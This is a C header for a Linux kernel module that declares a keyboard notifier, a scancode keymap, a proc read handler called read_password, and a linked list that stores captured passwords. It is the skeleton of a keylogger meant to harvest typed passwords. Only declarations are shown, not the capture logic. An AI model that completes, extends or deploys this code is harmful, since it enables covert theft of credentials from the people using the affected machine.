#ifndef HELPER_H
#define HELPER_H

/* Got this keymap from:
 * 	https://github.com/jarun/spy/blob/master/spy.c
 */
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/interrupt.h>
#include <linux/proc_fs.h>
#include <linux/sched.h>
#include <linux/keyboard.h>
#include <asm/uaccess.h>
#include <asm/io.h>
#include <linux/slab.h>
#include <linux/ctype.h>

extern int password_count;
extern char rules[4]; // Don't need 4 whole bytes for a 0 or 1

// 	42, 54, 14
static char *keymap[][2] = {
	{"\0", "\0"}, {"\0", "\0"}, {"1", "!"}, {"2", "@"},       // 0-3
	{"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"},                 // 4-7
	{"7", "&"}, {"8", "*"}, {"9", "("}, {"0", ")"},                 // 8-11
	{"-", "_"}, {"=", "+"}, {"\0", "\0"},         // 12-14
	{"\t", "\t"}, {"q", "Q"}, {"w", "W"}, {"e", "E"}, {"r", "R"},
	{"t", "T"}, {"y", "Y"}, {"u", "U"}, {"i", "I"},                 // 20-23
	{"o", "O"}, {"p", "P"}, {"[", "{"}, {"]", "}"},                 // 24-27
	{"\n", "\n"}, {"\0", "\0"}, {"a", "A"}, {"s", "S"},   // 28-31
	{"d", "D"}, {"f", "F"}, {"g", "G"}, {"h", "H"},                 // 32-35
	{"j", "J"}, {"k", "K"}, {"l", "L"}, {";", ":"},                 // 36-39
	{"'", "\""}, {"`", "~"}, {"\0", "\0"}, {"\\", "|"}, // 40-43
	{"z", "Z"}, {"x", "X"}, {"c", "C"}, {"v", "V"},                 // 44-47
	{"b", "B"}, {"n", "N"}, {"m", "M"}, {",", "<"},                 // 48-51
	{".", ">"}, {"/", "?"}, {"\0", "\0"}, {"\0", "\0"},
	{"\0", "\0"}, {" ", " "}, 
};

// Prototypes
struct notifier_block nb;
ssize_t read_password(struct file *filp,char *buf,size_t count,loff_t *offp );
int kb_notifier_fn(struct notifier_block *pnb, unsigned long action, void* data);
int init (void);
void cleanup(void);

#define PW_SIZE 16

struct password{//27 byte struct
	char pw[PW_SIZE]; // The passwords won't be longer than 15 characters with a null terminator
	int overwrite_num;
	struct password* next;
};

void push(struct password** head, char* password_value);
void ll_destructor(struct password** head);
void check_pw(char* pw, int len); // This function will call 'push' to do the allocating

#endif
